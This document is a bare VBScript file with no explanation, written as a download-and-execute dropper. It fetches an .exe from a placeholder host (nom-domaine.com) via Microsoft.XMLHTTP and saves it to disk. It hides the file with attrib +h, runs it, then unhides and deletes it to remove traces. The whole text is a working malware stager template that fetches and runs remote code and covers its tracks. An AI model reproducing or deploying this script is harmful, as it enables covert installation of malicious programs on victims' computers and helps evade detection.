Dim http_obj
Dim stream_obj
Dim shell_obj

Set http_obj = CreateObject("Microsoft.XMLHTTP")
Set stream_obj = CreateObject("ADODB.Stream")
Set shell_obj = CreateObject("WScript.Shell")

URL = "http://nom-domaine.com/fichier.exe"
FILENAME = "file.exe"
CMD1 = "cmd /c attrib +h " & FILENAME
CMD2 = "cmd /c attrib -h " & FILENAME
CMD3 = "cmd /c del " & FILENAME

http_obj.open "GET", URL, False
http_obj.send

stream_obj.Open
stream_obj.Type = 1 
stream_obj.Write http_obj.ResponseBody
stream_obj.SaveToFile FILENAME, 2 
stream_obj.Close

shell_obj.Run CMD1, 0, True
WScript.Sleep 3000

shell_obj.Run FILENAME, 1, True
shell_obj.Run CMD2, 0, True
shell_obj.Run CMD3, 0, True

Set shell_obj = Nothing 
